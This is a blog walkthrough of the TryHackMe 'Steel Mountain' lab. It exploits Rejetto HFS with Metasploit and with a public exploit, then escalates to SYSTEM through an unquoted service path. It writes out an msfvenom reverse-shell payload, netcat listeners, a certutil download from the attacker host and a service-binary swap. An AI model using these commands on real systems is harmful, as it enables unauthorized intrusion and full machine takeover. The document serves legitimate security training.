---
title: "TryHackMe - Steel Mountain - Walkthrough"
date: 2020-11-25T08:34:30-04:00
categories:
  - blog
tags:
  - learning
  - steelmountain
  - tryhackme
  - walkthrough
---

This is a [TryHackMe][tryhackme] walkthrough for the room: [Steel Mountain][sm]. Deploy the machine and let’s get started!

# Enumeration
Start with our friend, nmap: `nmap -T4 -A -p- 10.10.89.192`

![sm1](/assets/images/thm/steelmountain/sm1.png)

We get some good info here. We can see there is a website on port 80, also some other interesting ports. Let’s take a look at port 80 first!

![sm2](/assets/images/thm/steelmountain/sm2.webp)

Hmm…not much here. Viewing the page source gives us our first answer though!

![sm3](/assets/images/thm/steelmountain/sm3.png)

Let’s take a look at the other webserver (Second answer). For the third answer, take a look at the **Server Information**.

For the next answer, give Google a shot. [Exploit-DB][exdb] is always a good resource!

# Exploit
According to the next question, we need to use Metasploit: `msfconsole`

```bash
search rejetto 2.3
use 0
info
```
![sm4](/assets/images/thm/steelmountain/sm4.png)

This definitely looks like what we are looking for! Now we need to set the options:

```bash
options
set rhosts 10.10.89.192
set rhosts rport 8080
set lhost tun0
options
```

I think that’s all we need: `run`

We have a shell! Let’s look for the user flag.

```bash
getuid
shell
cd C:\Users\bill
dir Desktop
type Desktop\user.txt
```
We found our `user.txt` flag!

![sm5](/assets/images/thm/steelmountain/sm5.png)

Next, let’s download the provided PowerShell script: PowerUp

Just like the room tells us, let’s upload the script: `upload <path>/powerup.ps1`

Continue to follow the room instructions:

```powershell
load powershell
powershell_shell
. .\powerup.ps1
Invoke-AllChecks
```

Pay attention to all the checks being populated. There are some that have:
- `CanRestart: True`
- `Check: Unquoted Service Paths`

The ServiceName that belongs to those is our next answer!

Let’s create our payload using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<THM VPN IP> LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

Exit out of the PowerShell session CTRL + C and then upload the payload: `Advanced.exe`

Now let’s stop the service and copy the file into the correct directory:

`sc stop <name of service>`

`copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

Overwrite the current file. Now we need to setup a listener on our local machine so the payload has something to connect the reverse shell to!

`nc -nvlp 4443`

Start the service: `sc start <name of service>`

Go look at your `netcat` terminal and you should have a shell! Find the root flag.

![sm6](/assets/images/thm/steelmountain/sm6.png)

# Manual Exploitation
Now, we aren’t done with the room, but if this were real-world we have full system access and have complete control of the machine. I like how this room includes a manual exploitation section (good to learn for the OSCP) which is super useful!

We are provided with an exploit. So let’s keep going!

Create/copy the following files on your local machine:
- `exploit.py`
- `nc.exe`
- `winPEAS.exe`

Here are the links to download:
- [Exploit][rejetto]
- [nc listener][nc] (rename to `nc.exe` if it isn’t already)
- [winPEAS.exe][winpeas] (rename to `winPEAS.exe` if it isn’t already)
**NOTE:** Downloading winPEAS may get flagged by the browser. Make sure to accept any warning about a malicious file.

Now open 3 terminal windows:
1. Python Web Server
2. Netcat listener
3. run exploit

Edit the exploit to add our machine IP and port

![sm7](/assets/images/thm/steelmountain/sm7.png)

In the Python webserver run: `python3 -m http.server 80`

In the netcat listener terminal run: `nc -nvlp 1234`

In the exploit terminal run: `python exploit.py 10.10.89.192 8080` (run this twice)

You should now have a shell!

Navigate to `C:\Users\Bill\Desktop` and pull `winPEAS.exe` to the server

`certutil -urlcache -f http://<THM VPN IP>/winPEAS.exe winPEAS.exe`

Now that we have that on the server, we can run it by simply doing: `winPEAS.exe` which provides us with unquoted paths and the ServiceName.

Utilize Google to find out the last question: `powershell -c <command>`

Now the next steps to get system is the same as before:

1. Configure an `msfvenom` payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<THM VPN IP> LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```
2. Utilize `certutil` to get the payload onto the server
3. Stop the service
4. Start a new `netcat` listener
5. Start the service
6. You should now be `NT AUTHORITY\SYSTEM`

# Review
This was a really well done room. It was a “walkthrough” but didn’t give you everything. It is a good in-between for someone who is doing well in walkthroughs but gets stuck on CTF type rooms.

Steel Mountain provided a good overall review of enumeration, privilege escalation, and exploitation. My favorite part was that it covered metasploit exploitation and manual exploitation!

References
[TryHackMe][tryhackme] | [Steel Mountain Room][sm] | [Exploit-DB][exdb] | [Rejetto Exploit][rejetto] | [nc listener][nc] | [winPEAS Download][winpeas]

[tryhackme]: https://tryhackme.com
[sm]: https://tryhackme.com/why-subscribe?roomCode=steelmountain
[exdb]: https://www.exploit-db.com
[rejetto]: https://www.exploit-db.com/exploits/39161
[nc]: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
[winpeas]: https://github.com/peass-ng/PEASS-ng/tree/master
